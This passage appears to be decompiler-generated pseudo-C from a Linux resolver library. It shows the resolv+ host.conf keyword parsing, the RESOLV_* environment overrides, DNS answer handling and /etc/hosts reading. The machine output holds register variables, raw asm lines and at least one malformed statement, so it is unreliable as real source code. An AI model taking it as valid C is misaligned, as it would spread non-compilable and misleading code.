                                if(ebx != 0) {
                                    while(*ebx == 32 || *ebx == 9) {
                                        ebx = ebx + 1;
                                    }
                                    if(*ebx != 0) {
                                        goto L0804b34c;
                                    }
                                }
                                (save)"trim";
                                goto L0804b395;
L0804b34c:
                                L08056640(Vfffffbf8, ebx);
                                *( *L08078520 * 4 + 0x807a348) = Vfffffbf8;
                                *L08078520 = *L08078520 + 1;
                                edi = ebx;
                                al = 0;
                                asm("cld");
                                ecx = -1;
                                asm("repne scasb");
                                edx = !ecx;
                                Vfffffbec = edx;
                                Vfffffbf8 = Vfffffbf8 + Vfffffbec;
                                continue;
                            }
                            ebx = L08057B30(Vfffffbf0, " \t");
                            if(ebx != 0) {
                                if(*ebx != 0) {
                                    edx = *L08078FA0;
                                    do {
                                        if(*(edx + ( *ebx & 255) * 2 + 1) & 32) {
                                            break;
                                        }
                                        if(ebx = ebx + 1) {
                                            goto L0804b2bc;
                                        }
                                    } while(*ebx != 0);
                                }
                                if(ebx != 0 && *ebx != 0) {
                                    goto L0804b1c3;
                                }
                            }
L0804b2bc:
                            (save)"reorder";
                            goto L0804b395;
L0804b1c3:
                            edi = ebx;
                            al = 0;
                            asm("cld");
                            ecx = -1;
                            asm("repne scasb");
                            if(ecx == -4 && L080566BC(ebx, "on", 2) == 0) {
                                if(*(ebx + 2) == 0) {
                                    goto L0804b1fe;
                                }
                                edx = *(ebx + 2) & 255;
                                if(!( *( *L08078FA0 + edx * 2 + 1) & 32)) {
                                    goto L0804b1fe;
                                }
                            }
                            edi = ebx;
                            al = 0;
                            asm("cld");
                            ecx = -1;
                            asm("repne scasb");
                            if(ecx == -5 && L080566BC(ebx, "off", 3) == 0) {
                                if(*(ebx + 3) == 0) {
                                    goto L0804b24b;
                                }
                                edx = *(ebx + 3) & 255;
                                if(!( *( *L08078FA0 + edx * 2 + 1) & 32)) {
                                    goto L0804b24b;
                                }
                            }
                            (save)"reorder";
                            goto L0804b261;
L0804b24b:
                            *L0807851C = 0;
                            continue;
L0804b1fe:
                            *L0807851C = 1;
                            continue;
                        }
                        ebx = L08057B30(Vfffffbf0, " \t");
                        if(ebx != 0) {
                            if(*ebx != 0) {
                                edx = *L08078FA0;
                                do {
                                    if(*(edx + ( *ebx & 255) * 2 + 1) & 32) {
                                        break;
                                    }
                                    if(ebx = ebx + 1) {
                                        goto L0804b124;
                                    }
                                } while(*ebx != 0);
                            }
                            if(ebx != 0 && *ebx != 0) {
                                goto L0804b07f;
                            }
                        }
L0804b124:
                        (save)"alert";
                        goto L0804b395;
L0804b07f:
                        edi = ebx;
                        al = 0;
                        asm("cld");
                        ecx = -1;
                        asm("repne scasb");
                        if(ecx == -4 && L080566BC(ebx, "on", 2) == 0) {
                            if(*(ebx + 2) == 0) {
                                goto L0804b0ba;
                            }
                            edx = *(ebx + 2) & 255;
                            if(!( *( *L08078FA0 + edx * 2 + 1) & 32)) {
                                goto L0804b0ba;
                            }
                        }
                        edi = ebx;
                        al = 0;
                        asm("cld");
                        ecx = -1;
                        asm("repne scasb");
                        if(ecx == -5 && L080566BC(ebx, "off", 3) == 0) {
                            if(*(ebx + 3) == 0) {
                                goto L0804b107;
                            }
                            edx = *(ebx + 3) & 255;
                            if(!( *( *L08078FA0 + edx * 2 + 1) & 32)) {
                                goto L0804b107;
                            }
                        }
                        (save)"alert";
                        goto L0804b261;
L0804b107:
                        *L08078518 = 0;
                        continue;
L0804b0ba:
                        *L08078518 = 1;
                        continue;
                    }
                    ebx = L08057B30(Vfffffbf0, " \t");
                    if(ebx != 0) {
                        if(*ebx != 0) {
                            edx = *L08078FA0;
                            do {
                                if(*(edx + ( *ebx & 255) * 2 + 1) & 32) {
                                    break;
                                }
                                if(ebx = ebx + 1) {
                                    goto L0804afe0;
                                }
                            } while(*ebx != 0);
                        }
                        if(ebx != 0 && *ebx != 0) {
                            goto L0804af3b;
                        }
                    }
L0804afe0:
                    (save)"nospoof";
                    goto L0804b395;
L0804af3b:
                    edi = ebx;
                    al = 0;
                    asm("cld");
                    ecx = -1;
                    asm("repne scasb");
                    if(ecx == -4 && L080566BC(ebx, "on", 2) == 0) {
                        if(*(ebx + 2) == 0) {
                            goto L0804af76;
                        }
                        edx = *(ebx + 2) & 255;
                        if(!( *( *L08078FA0 + edx * 2 + 1) & 32)) {
                            goto L0804af76;
                        }
                    }
                    edi = ebx;
                    al = 0;
                    asm("cld");
                    ecx = -1;
                    asm("repne scasb");
                    if(ecx == -5 && L080566BC(ebx, "off", 3) == 0) {
                        if(*(ebx + 3) == 0) {
                            goto L0804afc3;
                        }
                        edx = *(ebx + 3) & 255;
                        if(!( *( *L08078FA0 + edx * 2 + 1) & 32)) {
                            goto L0804afc3;
                        }
                    }
                    (save)"nospoof";
                    goto L0804b261;
L0804afc3:
                    *L08078514 = 0;
                    continue;
L0804af76:
                    *L08078514 = 1;
                    continue;
                }
                ebx = L08057B30(Vfffffbf0, " \t");
                if(ebx != 0) {
                    if(*ebx != 0) {
                        edx = *L08078FA0;
                        do {
                            if(*(edx + ( *ebx & 255) * 2 + 1) & 32) {
                                break;
                            }
                            if(ebx = ebx + 1) {
                                goto L0804ae9c;
                            }
                        } while(*ebx != 0);
                    }
                    if(ebx != 0 && *ebx != 0) {
                        goto L0804adf7;
                    }
                }
L0804ae9c:
                (save)"multi";
L0804b395:
                (save)Vfffffbf4;
                (save)"resolv+: %s: \"%s\" command incorrectly formatted.\n";
                (save)12;
                (save)11;
                (save) *L08078F9C;
                goto L0804b3ac;
L0804adf7:
                edi = ebx;
                al = 0;
                asm("cld");
                ecx = -1;
                asm("repne scasb");
                if(ecx == -4 && L080566BC(ebx, "on", 2) == 0) {
                    if(*(ebx + 2) == 0) {
                        goto L0804ae32;
                    }
                    edx = *(ebx + 2) & 255;
                    if(!( *( *L08078FA0 + edx * 2 + 1) & 32)) {
                        goto L0804ae32;
                    }
                }
                edi = ebx;
                al = 0;
                asm("cld");
                ecx = -1;
                asm("repne scasb");
                if(ecx == -5 && L080566BC(ebx, "off", 3) == 0) {
                    if(*(ebx + 3) == 0) {
                        goto L0804ae7f;
                    }
                    edx = *(ebx + 3) & 255;
                    if(!( *( *L08078FA0 + edx * 2 + 1) & 32)) {
                        goto L0804ae7f;
                    }
                }
                (save)"multi";
L0804b261:
                (save)Vfffffbf4;
                (save)L0805E584( *L08078F9C, 11, 12, "resolv+: %s: \"%s\" command incorrectly formatted.\n");
                (save)0x80787a4;
                L0804F680();
                (save)ebx;
                (save)L0805E584( *L08078F9C, 11, 13, "resolv+: \"%s\" is an invalid keyword\n");
                (save)0x80787a4;
                L0804F680();
                esp = esp + 28;
                continue;
L0804ae7f:
                *L08078510 = 0;
                continue;
L0804ae32:
                *L08078510 = 1;
                continue;
            }
            ebx = L08057B30(Vfffffbf0, " \t");
            if(ebx != 0 && *(ebx + 1) != 0) {
                do {
                    if(*ebx == 32 || *ebx == 9) {
L0804ab7c:
                        ebx = ebx + 1;
                        continue;
                    }
                    edi = L08057B30(ebx, " ,;:");
                    if(edi != 0) {
                        *edi = 0;
                    }
                    if(L080566BC(ebx, "bind", 4) == 0) {
                        if(*(ebx + 4) == 0) {
                            goto L0804abc8;
                        }
                        edx = *(ebx + 4) & 255;
                        if(!( *( *L08078FA0 + edx * 2 + 1) & 32)) {
                            goto L0804abc8;
                        }
                    }
                    if(L080566BC(ebx, "hosts", 5) == 0) {
                        if(*(ebx + 5) == 0) {
                            goto L0804ac16;
                        }
                        edx = *(ebx + 5) & 255;
                        if(!( *( *L08078FA0 + edx * 2 + 1) & 32)) {
                            goto L0804ac16;
                        }
                    }
                    if(L080566BC(ebx, "nis", 3) == 0) {
                        if(*(ebx + 3) == 0) {
                            goto L0804ac52;
                        }
                        edx = *(ebx + 3) & 255;
                        if(!( *( *L08078FA0 + edx * 2 + 1) & 32)) {
                            goto L0804ac52;
                        }
                    }
                    (save)"order";
                    (save)Vfffffbf4;
                    (save)L0805E584( *L08078F9C, 11, 12, "resolv+: %s: \"%s\" command incorrectly formatted.\n");
                    (save)0x80787a4;
                    L0804F680();
                    (save)ebx;
                    (save)L0805E584( *L08078F9C, 11, 13, "resolv+: \"%s\" is an invalid keyword\n");
                    (save)0x80787a4;
                    L0804F680();
                    (save)"nis";
                    (save)"hosts";
                    (save)"bind";
                    (save)L0805E584( *L08078F9C, 11, 14, "resolv+: valid keywords are: %s, %s and %s\n");
                    (save)0x80787a4;
                    L0804F680();
                    esp = esp + 48;
                    goto L0804acf0;
L0804ac52:
                    *(esi * 4 + 0x8079dd4) = 3;
                    esi = esi + 1;
                    goto L0804acf0;
L0804ac16:
                    *(esi * 4 + 0x8079dd4) = 2;
                    esi = esi + 1;
                    goto L0804acf0;
L0804abc8:
                    *(esi * 4 + 0x8079dd4) = 1;
                    esi = esi + 1;
                    if(!( *L0807854C & 1)) {
                        L0804D744();
                    }
L0804acf0:
                    if(edi == 0) {
                        break;
                    }
                    ebx = edi + 1;
                } while(ebx != 0);
                if(esi != 0) {
                    continue;
                }
                (save)"order";
                (save)Vfffffbf4;
                (save)L0805E584( *L08078F9C, 11, 12, "resolv+: %s: \"%s\" command incorrectly formatted.\n");
                (save)0x80787a4;
                L0804F680();
                (save)"resolv+: search order not specified or unrecognized keyword, host resolution will fail.\n";
                (save)15;
                (save)11;
                (save) *L08078F9C;
                (save)L0805E584();
                (save)0x80787a4;
                L0804F680();
                esp = esp + 40;
                continue;
            }
            (save)"order";
            (save)Vfffffbf4;
            (save)"resolv+: %s: \"%s\" command incorrectly formatted.\n";
            (save)12;
            (save)11;
            (save) *L08078F9C;
L0804b3ac:
            esp = esp + 16;
            (save)L0805E584();
            (save)0x80787a4;
            L0804F680();
            esp = esp + 16;
        }
        goto L0804ab7c;
L0804b41c:
        *(esi * 4 + 0x8079dd4) = 0;
        L0804F540(Vfffffbfc);
    }
    ebx = L08055668("RESOLV_SERV_ORDER");
    if(ebx != 0) {
        esi = 0;
        ebx = L080568D0(ebx, " ,;:");
        if(ebx != 0) {
            do {
                if(L080566BC(ebx, "bind", 4) == 0) {
                    if(*(ebx + 4) == 0) {
                        goto L0804b492;
                    }
                    edx = *(ebx + 4) & 255;
                    if(!( *( *L08078FA0 + edx * 2 + 1) & 32)) {
                        goto L0804b492;
                    }
                }
                if(L080566BC(ebx, "hosts", 5) == 0) {
                    if(*(ebx + 5) == 0) {
                        goto L0804b4da;
                    }
                    edx = *(ebx + 5) & 255;
                    if(!( *( *L08078FA0 + edx * 2 + 1) & 32)) {
                        goto L0804b4da;
                    }
                }
                if(L080566BC(ebx, "nis", 3) == 0) {
                    if(*(ebx + 3) == 0) {
                        goto L0804b512;
                    }
                    edx = *(ebx + 3) & 255;
                    if(!( *( *L08078FA0 + edx * 2 + 1) & 32)) {
L0804b512:
                        *(esi * 4 + 0x8079dd4) = 3;
                        goto L0804b51d;
L0804b4da:
                        *(esi * 4 + 0x8079dd4) = 2;
L0804b51d:
                        esi = esi + 1;
                        goto L0804b51e;
L0804b492:
                        *(esi * 4 + 0x8079dd4) = 1;
                        esi = esi + 1;
                        if(!( *L0807854C & 1)) {
                            L0804D744();
                        }
                    }
                }
L0804b51e:
                ebx = L080568D0(0, " ,;:");
            } while(ebx != 0);
            *(esi * 4 + 0x8079dd4) = 0;
        }
    }
    ebx = L08055668("RESOLV_SPOOF_CHECK");
    if(ebx != 0) {
        if(L080566BC(ebx, "warn", 4) == 0) {
            if(*(ebx + 4) != 0) {
                edx = *(ebx + 4) & 255;
                if(*( *L08078FA0 + edx * 2 + 1) & 32) {
                    goto L0804b59c;
                }
            }
            *L08078514 = 1;
            *L08078518 = 1;
        } else {
L0804b59c:
            if(L080566BC(ebx, "off", 3) == 0) {
                if(*(ebx + 3) != 0) {
                    edx = *(ebx + 3) & 255;
                    if(*( *L08078FA0 + edx * 2 + 1) & 32) {
                        goto L0804b5dc;
                    }
                }
                *L08078514 = 0;
                *L08078518 = 0;
            } else {
L0804b5dc:
                if(L080566BC(ebx, "warn off", 8) == 0) {
                    if(*(ebx + 8) != 0) {
                        edx = *(ebx + 8) & 255;
                        if(*( *L08078FA0 + edx * 2 + 1) & 32) {
                            goto L0804b61c;
                        }
                    }
                    *L08078514 = 1;
                    *L08078518 = 0;
                } else {
L0804b61c:
                    *L08078514 = 1;
                }
            }
        }
    }
    ebx = L08055668("RESOLV_MULTI");
    if(ebx != 0) {
        if(L080566BC(ebx, "on", 2) == 0) {
            if(*(ebx + 2) == 0) {
                goto L0804b663;
            }
            edx = *(ebx + 2) & 255;
            if(!( *( *L08078FA0 + edx * 2 + 1) & 32)) {
L0804b663:
                *L08078510 = 1;
                goto L0804b67a;
            }
        }
        *L08078510 = 0;
    }
L0804b67a:
    ebx = L08055668("RESOLV_REORDER");
    if(ebx != 0) {
        if(L080566BC(ebx, "on", 2) == 0) {
            if(*(ebx + 2) == 0) {
                goto L0804b6b7;
            }
            edx = *(ebx + 2) & 255;
            if(!( *( *L08078FA0 + edx * 2 + 1) & 32)) {
L0804b6b7:
                *L0807851C = 1;
                goto L0804b6ce;
            }
        }
        *L0807851C = 0;
    }
L0804b6ce:
    ebx = L08055668("RESOLV_ADD_TRIM_DOMAINS");
    if(ebx != 0) {
        (save)" ,;:";
        for((save)ebx; 1; (save)0) {
            ebx = L080568D0();
            esp = esp + 8;
            if(ebx == 0) {
                break;
            }
            if(*L08078520 <= 3) {
                L08056640(Vfffffbf8, ebx);
                *( *L08078520 * 4 + 0x807a348) = Vfffffbf8;
                *L08078520 = *L08078520 + 1;
                edi = ebx;
                al = 0;
                asm("cld");
                ecx = -1;
                asm("repne scasb");
                edx = !ecx;
                Vfffffbec = edx;
                Vfffffbf8 = Vfffffbf8 + Vfffffbec;
            }
            (save)" ,;:";
        }
    }
    eax = L08055668("RESOLV_OVERRIDE_TRIM_DOMAINS");
    ebx = eax;
    if(ebx != 0) {
        *L08078520 = 0;
        Vfffffbf8 = 0x807a358;
        (save)" ,;:";
        for((save)ebx; 1; (save)0) {
            eax = L080568D0();
            ebx = eax;
            esp = esp + 8;
            if(ebx == 0) {
                break;
            }
            if(*L08078520 <= 3) {
                L08056640(Vfffffbf8, ebx);
                *( *L08078520 * 4 + 0x807a348) = Vfffffbf8;
                *L08078520 = *L08078520 + 1;
                edi = ebx;
                al = 0;
                asm("cld");
                ecx = -1;
                asm("repne scasb");
                edx = !ecx;
                Vfffffbec = edx;
                Vfffffbf8 = Vfffffbf8 + Vfffffbec;
            }
            (save)" ,;:";
        }
    }
    *L080784F8 = 1;
    esp = ebp + -1056;
}



L0804B800(A8, Ac, A10, A14, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffec8;
	/* unknown */ void  Vfffffed0;
	/* unknown */ void  Vfffffed4;
	/* unknown */ void  Vfffffed8;
	/* unknown */ void  Vfffffedc;
	/* unknown */ void  Vfffffee0;
	/* unknown */ void  Vfffffee4;
	/* unknown */ void  Vfffffee8;
	/* unknown */ void  Vfffffeec;
	/* unknown */ void  Vfffffef0;
	/* unknown */ void  Vfffffef4;
	/* unknown */ void  Vfffffef8;
	/* unknown */ void  Vfffffefc;



    Vfffffed4 = 0;
    Vfffffed0 = A10;
    *L08079E74 = 0;
    Vfffffef8 = A8 + Ac;
    ax = *(A8 + 6);
    asm("xchg al,ah");
    Vfffffee0 = ax & 65535;
    ax = *(A8 + 4);
    asm("xchg al,ah");
    Vfffffef4 = 0x8079f14;
    Vfffffee4 = 1025;
    esi = A8 + 12;
    if(ax != 1) {
        *L0807E788 = 3;
    } else {
        ebx = L0804D02C(A8, Vfffffef8, esi, Vfffffef4, Vfffffee4);
        if(ebx < 0) {
            *L0807E788 = 3;
        } else {
            L0805E954();
            esi = esi + ebx + 4;
            if(A18 == 1) {
                edi = Vfffffef4;
                al = 0;
                asm("cld");
                ecx = -1;
                asm("repne scasb");
                ebx = !ecx;
                edx = Vfffffef4;
                *L08079E74 = edx;
                Vfffffef4 = *L08079E74 + ebx;
                Vfffffee4 = Vfffffee4 - ebx;
                A10 = *L08079E74;
            }
            Vfffffef0 = 0x8079e88;
            *L08079E88 = 0;
            *L08079E78 = 0x8079e88;
            Vfffffeec = 0x8079de4;
            *L08079DE4 = 0;
            *L08079E84 = 0x8079de4;
            Vfffffedc = 0;
            Vfffffed8 = 0;
            eax = Vfffffee0;
            Vfffffee0 = Vfffffee0 - 1;
            if(eax > 0 && Vfffffef8 > esi) {
                do {
                    ebx = L0804D02C(A8, Vfffffef8, esi, Vfffffef4, Vfffffee4);
                    if(ebx >= 0) {
                        esi = esi + ebx;
                        (save)esi;
                        edi = L0804D6B8() & 65535;
                        esi = esi + 2;
                        (save)esi;
                        Vfffffee8 = L0804D6B8() & 65535;
                        esi = esi + 6;
                        (save)esi;
                        ebx = L0804D6B8() & 65535;
                        esi = esi + 2;
                        esp = esp + 12;
                        if(Vfffffee8 != A14) {
                            goto L0804bda7;
                        }
                        if(A18 == 1 && edi == 5) {
                            goto L0804b9f6;
                        }
                        if(A18 == 12 && edi == 5) {
                            goto L0804bb38;
                        }
                        if(A18 != edi) {
                            goto L0804bba7;
                        }
                        if(edi != 1) {
                            goto L0804bbe5;
                        }
                        if(L080565F8( *L08079E74, Vfffffef4) != 0) {
                            goto L0804bc86;
                        }
                        if(Vfffffedc == 0) {
                            *L08079E80 = ebx;
                            ecx = 0x8079e7c;
                            if(Vfffffee8 != 1) {
                                *ecx = 0;
                            } else {
                                *L08079E7C = 2;
                            }
                            edx = Vfffffef4;
                            *L08079E74 = edx;
                            edi = Vfffffef4;
                            al = 0;
                            asm("cld");
                            ecx = -1;
                            asm("repne scasb");
                            ecx = !ecx;
                            Vfffffec8 = ecx;
                            Vfffffef4 = edx + ecx;
                            Vfffffee4 = Vfffffee4 - ecx;
                        } else {
                            if(*L08079E80 != ebx) {
                                goto L0804bda7;
                            }
                        }
                        Vfffffef4 = Vfffffef4 + 4 - (Vfffffef4 & 3);
                        if(Vfffffef4 + ebx < 0x807a315) {
                            if(Vfffffeec < 0x8079e6c) {
                                eax = Vfffffef4;
                                edx = Vfffffeec;
                                *edx = eax;
                                Vfffffeec = edx + 4;
                                L08056480(esi, *edx, ebx);
                                Vfffffef4 = Vfffffef4 + ebx;
                                esi = esi + ebx;
                                goto L0804bde0;
                            }
                            if(*L0807854C & 2) {
                                goto L0804bda7;
                            }
                            Vfffffed4 = Vfffffed4 + 1;
                            if(Vfffffed4 != 1) {
                                goto L0804bda7;
                            }
                            L0804F7EC("Too many addresses (%d)\n", 35);
                            goto L0804bda7;
                        }
                        if(!( *L0807854C & 2)) {
                            L0804F7EC("size (%d) too big\n", ebx);
                            goto L0804bd6c;
L0804bda7:
                            esi = esi + ebx;
                            goto L0804bdef;
L0804bc86:
                            (save)Vfffffef4;
                            edx = *L08079E74;
                            goto L0804bc8d;
L0804bbe5:
                            if(edi != 12) {
                                L08055ECC();
                            } else {
                                if(L080565F8(Vfffffed0, Vfffffef4) != 0) {
                                    goto L0804bc10;
                                }
                                if(L0804D02C(A8, Vfffffef8, esi, Vfffffef4, Vfffffee4) >= 0) {
                                    goto L0804bc4c;
                                }
                                Vfffffed8 = Vfffffed8 + 1;
                            }
L0804bde0:
                            if(Vfffffed8 != 0) {
                                goto L0804bdef;
                            }
                            Vfffffedc = Vfffffedc + 1;
                            goto L0804bdef;
L0804bc10:
                            (save)Vfffffef4;
                            edx = A10;
L0804bc8d:
                            (save)edx;
                            (save)L0805E584( *L08078F9C, 11, 26, "gethostby*.getanswer: asked for \"%s\", got \"%s\"");
                            (save)37;
                            L08054EB0();
                            esi = esi + ebx;
                            esp = esp + 16;
                            goto L0804bdef;
L0804bba7:
                            (save)Vfffffef4;
                            (save)edi;
                            (save)A10;
                            (save)A18;
                            (save)L0805E584( *L08078F9C, 11, 28, "gethostby*.getanswer: asked for type %d(%s), got %d(%s)");
                            (save)37;
                            L08054EB0();
                            esi = esi + ebx;
                            esp = esp + 24;
                            goto L0804bdef;
L0804bb38:
                            ebx = L0804D02C(A8, Vfffffef8, esi, & Vfffffefc, 257);
                            if(ebx >= 0) {
                                esi = esi + ebx;
                                edi = & Vfffffefc;
                                al = 0;
                                asm("cld");
                                ecx = -1;
                                asm("repne scasb");
                                ebx = !ecx;
                                if(Vfffffee4 >= ebx) {
                                    L08056640(Vfffffef4, & Vfffffefc);
                                    edx = Vfffffef4;
                                    Vfffffed0 = edx;
                                    goto L0804bb86;
L0804b9f6:
                                    if(Vfffffef0 >= 0x8079f10) {
                                        goto L0804bdef;
                                    }
                                    ebx = L0804D02C(A8, Vfffffef8, esi, & Vfffffefc, 257);
                                    if(ebx >= 0) {
                                        esi = esi + ebx;
                                        if(*L08079E74 != 0 && L080565F8( *L08079E74, Vfffffef4) != 0) {
                                            goto L0804ba5c;
                                        }
                                        edx = Vfffffef4;
                                        eax = Vfffffef0;
                                        *eax = edx;
                                        Vfffffef0 = eax + 4;
                                        edi = Vfffffef4;
                                        al = 0;
                                        asm("cld");
                                        ecx = -1;
                                        asm("repne scasb");
                                        ebx = !ecx;
                                        Vfffffef4 = edx + ebx;
                                        Vfffffee4 = Vfffffee4 - ebx;
                                        edi = & Vfffffefc;
                                        asm("cld");
                                        ecx = -1;
                                        asm("repne scasb");
                                        ebx = !ecx;
                                        if(Vfffffee4 >= ebx) {
                                            goto L0804baed;
                                        }
                                    }
                                }
                            }
                        }
                    }
L0804bd6c:
                    Vfffffed8 = Vfffffed8 + 1;
                    goto L0804bdef;
L0804baed:
                    (save) & Vfffffefc;
                    (save)Vfffffef4;
                    L08056640();
                    edx = Vfffffef4;
                    *L08079E74 = edx;
L0804bb86:
                    Vfffffef4 = edx + ebx;
                    Vfffffee4 = Vfffffee4 - ebx;
                    goto L0804bdef;
L0804ba5c:
                    (save)Vfffffef4;
                    (save) *L08079E74;
                    (save)L0805E584( *L08078F9C, 11, 27, "gethostby*.getanswer: asked for \"%s\", got CNAME for \"%s\"");
                    (save)37;
                    L08054EB0();
                    esp = esp + 16;
L0804bdef:
                    eax = Vfffffee0;
                    Vfffffee0 = Vfffffee0 - 1;
                    if(eax <= 0 || Vfffffef8 <= esi) {
                        break;
                    }
                } while(Vfffffed8 == 0);
                goto L0804be14;
L0804bc4c:
                *L08079E74 = Vfffffef4;
L0804bc58:
                eax = 0x8079e74;
                goto L0804bea0;
            }
L0804be14:
            if(Vfffffedc != 0) {
                *Vfffffef0 = 0;
                *Vfffffeec = 0;
                if(!( *L080786A8 & 240) && Vfffffedc > 1 && A14 == 1 && A18 == 1) {
                    L0804CBE4(0x8079de4, Vfffffedc);
                }
                if(*L08079E74 != 0) {
                    goto L0804bc58;
                }
                L08056640(Vfffffef4, A10);
                *L08079E74 = Vfffffef4;
                goto L0804bc58;
            }
            *L0807E788 = 2;
        }
    }
    eax = 0;
L0804bea0:
    esp = ebp + -324;
}




L0804BF80(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffc00;



    if(!( *( *L08078FA0 + ( *A8 & 255) * 2 + 1) & 8)) {
        ecx = A8;
        goto L0804c049;
L0804bfac:
        (save)A8;
        eax = L0804CE8C();
        *L0807A318 = eax;
        if(*L0807A318 == -1) {
            *L0807E788 = 1;
            goto L0804c225;
        }
        *L08079E74 = A8;
        *L08079E78 = 0x8079e88;
        *L08079E88 = 0;
        *L08079E7C = 2;
        *L08079E80 = 4;
        *L08079DE4 = 0x807a318;
        *L08079DE8 = 0;
        *L08079E84 = 0x8079de4;
        *L0807E788 = 0;
        eax = 0x8079e74;
        goto L0804c227;
L0804c049:
        while(*ecx != 0) {
            edx = *ecx & 255;
            if(!( *( *L08078FA0 + edx * 2 + 1) & 8) && *ecx != 46) {
                goto L0804c058;
            }
            ecx = ecx + 1;
        }
        if(*(ecx - 1) != 46) {
            goto L0804bfac;
        }
    }
L0804c058:
    if(*L080784F8 == 0) {
        L0804A9D8();
    }
    edi = 0;
    if(*L08079DD4 != 0) {
        do {
            if(edi > 3) {
                break;
            }
            eax = *(edi * 4 + 0x8079dd4);
            if(eax == 2) {
                if(*L0807A348 == 0) {
                    esi = L0804C6FC(A8);
                } else {
                    (save)A8;
                    ebx = L08056664();
                    L0804A4F4(ebx);
                    (save)ebx;
                    esi = L0804C6FC();
                    (save)ebx;
                    L0805C290();
                    esp = esp + 16;
                }
                if(*L08079DE8 != 0 && *L0807851C != 0) {
                    L0804A5CC(esi);
                }
                if(esi != 0) {
                    goto L0804c1fa;
                }
L0804c20c:
                *L0807E788 = 1;
            } else {
                > ? L0804c0a0 : ;
                if(eax != 1) {
                    goto L0804c098;
                }
                eax = L0804E180(A8, 1, 1, & Vfffffc00, 1024);
                if(eax >= 0) {
                    esi = L0804B800( & Vfffffc00, eax, A8, 1, 1);
                    if(*L08079DE8 != 0 && *L0807851C != 0) {
                        L0804A5CC(esi);
                    }
                    if(esi == 0) {
                        goto L0804c216;
                    } else {
                        goto L0804c1fa;
                    }
                }
                if(!( *L0807854C & 2)) {
                    L0804F7EC("res_search failed\n");
                    goto L0804c216;
L0804c098:
                }
            }
L0804c216:
            edi = edi + 1;
        } while(*(edi * 4 + 0x8079dd4) != 0);
        goto L0804c225;
        if(eax != 3) {
            goto L0804c216;
        }
        if(*L0807A348 != 0) {
            (save)A8;
            ebx = L08056664();
            L0804A4F4(ebx);
            (save)"hosts.byname";
            (save)ebx;
            esi = L0804C9E4();
            (save)ebx;
            L0805C290();
            esp = esp + 20;
        } else {
            esi = L0804C9E4(A8, "hosts.byname");
        }
        if(*L08079DE8 != 0 && *L0807851C != 0) {
            L0804A5CC(esi);
        }
        if(esi == 0) {
            goto L0804c20c;
        }
L0804c1fa:
        *L0807E788 = 0;
        eax = L0804A580(esi);
    } else {
L0804c225:
        eax = 0;
    }
L0804c227:
    esp = ebp + -1040;
}




L0804C538(A8)
/* unknown */ void  A8;
{



    if(*L08078508 == 0) {
        (save)"r";
        (save)"/etc/hosts";
        eax = L0804F620();
        *L08078508 = eax;
    } else {
        eax = L08054DB8( *L08078508);
    }
    *L0807850C = *L0807850C | A8;
}


L0804C574()
{



    if(*L08078508 != 0 && *L0807850C == 0) {
        eax = L0804F540( *L08078508);
        *L08078508 = 0;
    }
}



L0804C5A4()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;



    if(*L08078508 == 0) {
        eax = L0804F620("/etc/hosts", "r");
        *L08078508 = eax;
        if(*L08078508 == 0) {
            *L0807E788 = -1;
            eax = 0;
            goto L0804c6f3;
        }
    }
L0804c5e0:
    do {
        esi = L0804F5C4(0x8079f14, 1024, *L08078508);
        if(esi == 0) {
            goto L0804c5fe;
        }
        if(*esi == 35) {
            goto L0804c5e0;
        }
        ebx = L08057B30(esi, "#\n");
        if(ebx == 0) {
            goto L0804c5e0;
        }
        *ebx = 0;
        ebx = L08057B30(esi, " \t");
    } while(ebx == 0);
    goto L0804c640;
L0804c5fe:
    *L0807E788 = 1;
    eax = 0;
    goto L0804c6f3;
L0804c640:
    *ebx = 0;
    ebx = ebx + 1;
    *L08079E84 = 0x807a340;
    *L0807A340 = 0x807a31c;
    edx = L0804CE8C(esi);
    *( *( *L08079E84)) = edx;
    *L08079E80 = 4;
    for(*L08079E7C = 2; *ebx == 32 || *ebx == 9; ebx = ebx + 1) {
    }
    *L08079E74 = ebx;
    *L08079E78 = 0x8079e88;
    for(esi = 0x8079e88; 1; esi = esi + 4) {
        ebx = L08057B30(ebx, " \t");
        if(ebx == 0) {
            break;
        }
        *ebx = 0;
        do {
            if(!(ebx = ebx + 1) || *ebx == 0) {
                goto L0804c6de;
            }
            if(*ebx == 32) {
                continue;
            }
        } while(*ebx == 9);
        if(esi >= 0x8079f10) {
            continue;
        }
        *esi = ebx;
    }
L0804c6de:
    *esi = 0;
    *L0807E788 = 0;
    eax = 0x8079e74;
L0804c6f3:
}


L0804C6FC(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffff8c;
	/* unknown */ void  Vffffff90;
	/* unknown */ void  Vffffff94;
	/* unknown */ void  Vffffff98;
	/* unknown */ void  Vffffff9c;
	/* unknown */ void  Vffffffa0;
	/* unknown */ void  Vffffffa4;
	/* unknown */ void  Vffffffa8;
	/* unknown */ void  Vffffffac;
	/* unknown */ void  Vffffffb0;
	/* unknown */ void  Vffffffb4;
	/* unknown */ void  Vffffffb8;
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vffffffc0;



    edi = 0;
    Vffffff9c = 0;
    Vffffffb4 = 0x8079bb8;
    Vffffffb0 = 0x8079c48;
    *L08079BB8 = 0;
    *L08079C48 = 0;
    Vffffffac = 0x80793b4;
    Vffffffa8 = 0x80797b5;
    Vffffffa4 = 1025;
    Vffffffa0 = 1025;
    *L08079CEC = 0;
    *L08079CF0 = 0;
    (save)A8;
    (save)0x8079d78;
    L08056640();
    (save)64;
    (save) & Vffffffc0;
    L08056954();
    L0804C538(0);
    for(Vffffff98 = ebx; 1; Vffffff9c = 0) {
        esi = L0804C5A4();
        if(esi == 0) {
            goto L0804c8d8;
        }
        if(L080565F8( *esi, A8) != 0) {
L0804c7b0:
            ebx = *(esi + 4);
            do {
                if(L080565F8( *ebx, A8) == 0) {
                    edi = edi + 1;
                    *L08079CEC = A8;
                    L08056640(0x8079d78, *esi);
                }
                ebx = ebx + 4;
            } while(*ebx != 0);
        } else {
            edi = edi + 1;
        }
        if(L080565F8( *esi, Vffffff98) != 0) {
            ebx = *(esi + 4);
            do {
